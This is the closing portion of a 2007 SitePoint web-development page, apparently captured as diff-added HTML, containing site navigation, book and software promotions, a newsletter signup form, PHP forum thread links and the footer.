+												<li><a href="/subcat/javascript" title="Articles and tutorials on using Javascript, AJAX and the DOM (Document Object Model)"> JavaScript &amp; AJAX Tutorials</a></li>
+												<li><a href="/subcat/xml" title="In-depth articles explaining the usages of XML-based data, processing it and transforming it using XSL XSLT."> XML, XSLT &amp; Web Services</a></li>
+						</ul>
+	<h4><a href="/cat/server-side-coding" title="Creating online applications using server side scripts or code">Server Side Coding</a></h4>
+
+	<ul>
+									<li><a href="/subcat/asp" title="Tutorials on using Microsoft&#039;s ASP and ASP.NET for creating your online web applications"> ASP &amp; .NET Tutorials</a></li>
+												<li><a href="/subcat/perl" title="Tutorials for developing web applications in Perl, and using CGI"> CGI &amp; Perl Tutorials</a></li>
+												<li><a href="/subcat/coldfusion" title="Tutorials and articles related to building online applications using Adobe ColdFusion"> ColdFusion Tutorials</a></li>
+
+												<li><a href="/subcat/java" title="Creating client-side and server-side applications using Java technology"> Java and J2EE</a></li>
+												<li><a href="/subcat/php-news" title="News on the latest developments in PHP and interviews with some leading figures in PHP application development"> PHP &amp; MySQL News &amp; Interviews</a></li>
+												<li class="navitem-atv"><a href="/subcat/php-tutorials"> PHP &amp; MySQL Tutorials</a></li>
+
+												<li><a href="/subcat/php-reviews" title="Reviews of new or popular PHP and MySQL scripts and applications"> PHP &amp; MySQL Reviews and Apps</a></li>
+												<li><a href="/subcat/server-side" title="Everything you need to know about server-side development in relation to other languages"> Server Side Essentials</a></li>
+												<li><a href="/subcat/other-technologies" title="Tutorials on configuring the two most popular web servers, Apache and IIS, for optimum performance"> Apache &amp; IIS Configuration</a></li>
+						</ul>
+
+	<h4><a href="/cat/site-strategy" title="Managing a successful website">Site Strategy</a></h4>
+	<ul>
+									<li><a href="/subcat/community-strategy" title="Tutorials and views on creating an online community using bulletin boards, forums, chat rooms, and so on"> Community</a></li>
+												<li><a href="/subcat/content-strategy" title="Writing and sourcing quality content for your site"> Content</a></li>
+												<li><a href="/subcat/ecommerce-strategy" title="How to plan, build and manage an ecommerce website and do business on the internet"> eCommerce</a></li>
+
+						</ul>
+	<h4><a href="/cat/site-marketing" title="Tips and tutorials on website marketing ">Site Marketing</a></h4>
+	<ul>
+									<li><a href="/subcat/traffic-analysis" title="Analyze your site statistics to gain a better understanding of the ways in which your visitors are using your web site"> Traffic Analysis</a></li>
+												<li><a href="/subcat/searchmarketing" title="Information about marketing your web site or online business via search engines "> Search Marketing</a></li>
+												<li><a href="/subcat/promotions" title="Deals with techniques to promote your site  outside search engines"> Other Promotions</a></li>
+
+						</ul>
+	<h4><a href="/cat/sell-your-services" title="Selling your web design or development services as a freelancer or in a team">Sell Your Services</a></h4>
+	<ul>
+									<li><a href="/subcat/services-start" title="Tips and resources for planning to sell services on the web"> Get Started</a></li>
+												<li><a href="/subcat/find-clients" title="Find clients for your online business"> Find Clients</a></li>
+												<li><a href="/subcat/work-smarter" title="Time management and scheduling strategies for web developers"> Work Smarter</a></li>
+
+						</ul>
+</div>
+</div>
+<div class="product clearfix">
+
+<h4 style="text-align: center;">
+	<a style="color: #528057;" href="/marketplace/">
+		SitePoint Marketplace
+	</a>
+</h4>
+
+<div class="wrapcenter">
+	<a href="/marketplace/">
+
+		<img src="/images/ads/marketplace/graphic1.png" alt="Buy, Sell, Trade" />
+	</a>
+</div>
+
+<p>Buy and sell Websites, templates,
+domain names, hosting, graphics and more.</p>
+
+<p class="wrapright"><a href="/marketplace/" class="next">Tell me more...</a></p>
+
+</div><div class="product clearfix">
+<h3>SitePoint Software</h3>
+
+<div class="wrapcenter"><img src="/images/editize/box.gif" width="115" height="140" 
+alt="Editize" /></div>
+
+<h5><a href="http://www.editize.com" rel="external">Now even the CEO can edit the company Website!</a></h5>
+<p>Never mind showing people how to use HTML or XML to markup their Website content.  Download Editize, drop it into your CMS and forget about it...<br /></p>
+<p class="wrapright"><a href="http://www.editize.com" rel="external" class="next">Tell me more..</a></p>
+
+</div>
+
+
+
+
+<!-- SitePoint Jobs: start -->
+<div class="nav">
+<h3>SitePoint Jobs</h3>
+<h4>&raquo; <a class="alert" href="http://www.sitepoint.com/about/jobs/"> We&#39;re Hiring!</a></h4>
+
+</div> <!-- SitePoint Jobs: end  -->
+
+
+
+
+<div class="nav">
+<h3>SitePoint Newsletters</h3>
+<form id="subs" action="/newsletter/manage" method="post">
+	
+	    
+	
+		<p>Get all the latest tips
+			on <strong><em> Advanced Server Side Coding </em></strong>
+		by signing up to all of SitePoint&rsquo;s informative newsletters.</p>
+
+		
+	
+	<div style="margin-left: 6px;">
+	
+		<ul style="border:0px none">
+		<li>
+			<input type="hidden" value="subscribe" name="action" />
+			<input type="hidden" value="2" name="refererid" />
+			<input type="checkbox" checked="checked" name="newsletterid[]" value="3" id="checktt" /> <label for="checktt">SitePoint TechTimes</label>
+		</li>
+	
+		<li>
+
+			<input type="checkbox" checked="checked" name="newsletterid[]" value="2" id="checktr" /> <label for="checktr">SitePoint Tribune</label>
+		</li>
+		<li>
+			<input type="checkbox" checked="checked" name="newsletterid[]" value="5" id="checkdv" /> <label for="checkdv">SitePoint Design View</label>
+		</li>
+		<li>
+			<input type="checkbox" checked="checked" name="newsletterid[]" value="4" id="checkcc" /> <label for="checkcc">Community Crier</label>
+
+		</li>
+		</ul>
+	
+	
+	
+		<p><input class="tbox" onfocus="this.value=''" value="Enter Work Email" name="email" />
+		<input type="submit" value="Subscribe!" name="submit" /></p>
+	
+	
+		<p>
+		<input type="radio" checked="checked" value="html" name="format" id="radiohtml" /> HTML &nbsp;
+		 <input type="radio" value="text" name="format" id="radioplain" /> Plain</p>
+
+	
+	</div>
+</form>
+
+
+<h6 class="wrapcenter tiny"><br />View Our <a href="http://www.sitepoint.com/privacy.php">Privacy
+Policy</a></h6>
+<h6 class="wrapright tiny">
+Sample Our <a href="http://www.sitepoint.com/newsletter/archives">Newsletter Archives</a></h6>
+</div>
+
+    
+
+  
+
+</div><!-- end #col1 --> 
+
+</div><!-- end #maincontent -->
+
+<!-- ***************  Start Column 3 ************   -->
+<div id="col3">
+
+<!-- comment -->
+
+<div class="product">
+<h3 class="nomargin">SitePoint Kits </h3>
+<h5><a href="http://www.sitepoint.com/launch/7e8971/">The Search Engine Marketing Kit</a></h5>
+<img src="/images/books/sem1/sem-thumbnail.gif"  width="83" height="108" alt="The Search Engine Marketing Kit"  style="float:right;" /> 
+<p >Proven methods to increase your Traffic!</p>
+<h6 class="download"><a href="http://www.sitepoint.com/popup/popup.php?zone=2&amp;popupid=53" rel="popup|420|560" > Download Sample Chapter</a></h6>
+
+<h5><a href="http://www.sitepoint.com/launch/71e2e6/">The Web Design Business Kit</a></h5> 
+<img src="/images/books/freelance1/freelance106x104.gif" alt="The Web Design Business Kit" width="106" height="104" style="float:right;" />
+<p >Winning strategies to increase your Income!</p>
+<h6 class="download"><a href="http://www.sitepoint.com/popup/popup.php?zone=2&amp;popupid=51" rel="popup|420|560" > Download Sample Chapters</a></h6>
+
+</div>
+    <div class="product">
+      <h3 class="nomargin">
+        NEW! - February 2007
+      </h3>
+
+        <h5>
+          <a href="http://www.sitepoint.com/launch/38958c">
+          <img src="/images/books/rails1/rails1-rgt.png"
+						alt="Book:" class="wrapleft" />
+						Build Your Own Ruby on Rails Web Applications</a>
+        </h5>
+        <p>
+          Ruby on Rails put the fun back into developing web applications.
+        </p>
+        <h6 class="download" style="clear: left;">
+
+          <a href="/popup/popup.php?zone=2&amp;popupid=94" rel="popup|350|560">
+          Download the FREE sample chapters</a>
+        </h6>
+    </div>
+
+    <div class="product">
+      <h3 class="nomargin">
+        NEW! - September 2006
+      </h3>
+
+        <h5>
+          <a href="http://www.sitepoint.com/launch/786eda" title=
+          "Finally a Photoshop CS2 book that takes Web designers seriously!"><img src="/images/books/photoshop1/photoshop1-thumb.gif"
+						alt="Book:The Photoshop Anthology" class="wrapleft" />The Photoshop Anthology: 101 Web Design Tips, Tricks &amp; Techniques</a>
+          
+						
+        </h5>
+       <p>
+          At last a Photoshop CS2 book that takes Web design seriously!
+        </p>
+        <h6 class="download" style="clear: left;">
+          <a href="/popup/popup.php?zone=2&amp;popupid=81" rel="popup|350|560">
+
+          Download the FREE sample chapters</a>
+        </h6>
+    </div>
+
+    <div class="product new">
+      <h3>
+        NEW! - November 2006
+      </h3>
+        <h5>
+
+          <a href="http://www.sitepoint.com/launch/95d728" title=
+          "Find out more about this book"><img src="/images/books/aspnet2/col3cov.gif"
+						alt="Book: Build Your Own ASP.NET 2.0 Web Site Using C# &amp; VB, 2nd Edition" class="wrapleft" />Build Your Own ASP.NET 2.0 Web Site Using C# &amp; VB, 2nd Edition</a>
+          
+						
+        </h5>
+        <p>
+          Tap the Power and Speed of Microsoft&rsquo;s Next Generation Framework -- ASP.NET 2.0
+        </p>
+        <h6 class="download" style="clear: left;">
+          <a href="/popup/popup.php?zone=2&amp;popupid=86" rel="popup|350|560">
+
+          Download the FREE sample chapters</a>
+        </h6>
+    </div>
+
+
+    <div class="product">
+      <h3>
+        SitePoint Books
+      </h3><p>
+          Download sample chapters of any of our popular books.		  
+        </p>
+
+		<div class="crop"><img src="/images/books/stack-alpha2.gif" alt="Stack of Books" width="160" height="132" />   </div>
+		
+<h5><a href="/books/rails1/" rel="popup|420|560|elastic">Build Your Own Ruby on Rails Web Applications</a><br />By Patrick Lenz</h5><h5><a href="/books/photoshop1/" rel="popup|420|560|elastic">The Photoshop Anthology: 101 Web Design Tips, Tricks &amp; Techniques</a><br />By Corrie Haffly</h5><h5><a href="/books/aspnet2/" rel="popup|420|560|elastic">Build Your Own ASP.NET 2.0 Web Site Using C# &amp; VB. 2nd Edition</a><br />By Cristian Darie &amp; Zak Ruvalcaba</h5><h5><a href="/books/checklists1/" rel="popup|420|560|elastic">Deliver First Class Web Sites: 101 Essential Checklists</a><br />By Shirley Kaiser</h5><h5><a href="/books/phpmysql1/" rel="popup|420|560|elastic">Build Your Own Database Driven Website Using PHP &amp; MySQL</a><br />By Kevin Yank</h5><h5><a href="/books/css2/" rel="popup|420|560|elastic">HTML Utopia: Designing Without Tables Using CSS, 2nd Edition</a><br />By Rachel Andrew &amp; Dan Shafer</h5><h5><a href="/books/html1/" rel="popup|420|560|elastic">Build Your Own Web Site The Right Way Using HTML &amp;  CSS</a><br />By Ian Lloyd</h5><h5><a href="/books/ajax1/" rel="popup|420|560|elastic">Build Your Own AJAX Web Applications</a><br />By Matthew Eernisse</h5><h5><a href="/books/cssant1/" rel="popup|420|560|elastic">The CSS Anthology: 101 Essential Tips, Tricks &amp; Hacks</a><br />By Rachel Andrew</h5><h5><a href="/books/dhtml1/" rel="popup|420|560|elastic">DHTML Utopia:  Modern Web Design Using JavaScript &amp; DOM</a><br />By Stuart Langridge</h5><h5><a href="/books/jsant1/" rel="popup|420|560|elastic">The JavaScript Anthology: 101 Essential Tips, Tricks &amp;amp; Hacks</a><br />By  James Edwards &amp; Cameron Adams</h5><h5><a href="/books/xml1/" rel="popup|420|560|elastic">No Nonsense XML Web Development With PHP</a><br />By Thomas Myer</h5><h5><a href="/books/phpant1/" rel="popup|420|560|elastic">The PHP Anthology: Object Oriented PHP Solutions</a><br />By Harry Fuecks</h5>
+
+    </div>
+
+
+
+
+<div class="nav">
+<h3>Related Forum Discussions</h3>
+<p>
+	Related Forum: <strong><a href="/forums/forumdisplay.php?forumid=34">PHP</a></strong>
+</p>
+<ol>
+
+	<li><a href="/forums/showthread.php?t=457183">If Textbox is Blank or has Spaces</a
+  </li>
+	<li><a href="/forums/showthread.php?t=457181">Querying from mysql and then qeury again using that result set. Please Help</a
+  </li>
+	<li><a href="/forums/showthread.php?t=457173">max number of chars for the array index</a
+  </li>
+	<li><a href="/forums/showthread.php?t=457171">Cookie in PHP 5.2</a
+  </li>
+	<li><a href="/forums/showthread.php?t=457170">FireFox Great, Netscape Awesome, Explorer Stupid. Help.</a
+  </li>
+
+</ol>
+</div>
+
+
+<!-- Other Articles -->
+
+<!-- show other articles only if there are any! -->
+
+
+<!-- Related Articles -->
+
+<!-- related articles shown only if there is any! -->
+<div class="nav">
+	<h3>Related Articles</h3>
+	<p>If you liked this article, these might interest you too.</p>
+
+	<ol>
+			<li><a href="/article/write-secure-scripts-php-4-2" > Write Secure Scripts with PHP 4.2!</a><br />
+		<span class="subtext">Rated : <em>9/10</em></span></li>
+		
+			<li><a href="/article/secure-linux-server" > Secure Your Linux Server</a><br />
+		<span class="subtext">Rated : <em>7.5/10</em></span></li>
+
+		
+		
+	</ol>
+	</div>
+
+
+
+</div>
+
+<!-- end #col3 -->
+
+
+	</div><!-- end content -->
+
+
+
+
+<div id="footer">
+
+<div class="sorry">
+Notice: This Website takes advantage of web standards that your browser may be
+unable to support.  This site may not display in the way it was intended in some
+browsers.  However the page content should still be perfectly viewable in any internet
+capable device.
+</div>
+
+<div id="tertiary">
+
+<ul>
+	<li><a href="/mediakit">Advertise</a> </li>
+	<li><a href="/about/">About Us</a> </li>
+
+	<li><a href="/contact">Contact Us</a> </li>
+	<li><a href="/sitemap" accesskey="3">Site Map</a> </li>
+	<li><a href="/about/writeforus">Write For Us</a> </li>
+	<li><a href="/syndication/">RSS</a> </li>
+	<li><a href="/search/search.php" accesskey="4">Search</a> </li>
+
+	<li><a href="/privacy/" accesskey="8">Privacy</a> </li>
+	<li><a href="/glossary.php?q=A">Glossary</a> </li>
+	<li><a href="/about/jobs/">Jobs</a> </li>
+	<li><a href="/accesskeys/" accesskey="0" rel="popup|450|280" title="Launch a window to view this site's Accesskeys">AccessKeys</a> </li>
+</ul>
+
+</div>
+<p>The contents of this webpage are copyright &copy; 1998-2007
+SitePoint Pty. Ltd. All Rights Reserved.</p>
+
+
+
+
+<div class='shuffle2'>
+<a href="http://www.sitepoint.com.au"  title="Visit our development site">Web Design &amp; Development by SitePoint, Melbourne, Australia</a> -
+<a href="http://www.editize.com"  title="Visit the home of Editize">Content Management System using Editize</a> - 
+
+<a href="http://www.domainguru.com" title="Domain Registrations">Traffic Domain Name Blog</a>
+</div>
+
+</div><!-- end footer -->
+
+</body>
+</html>
+
+
+
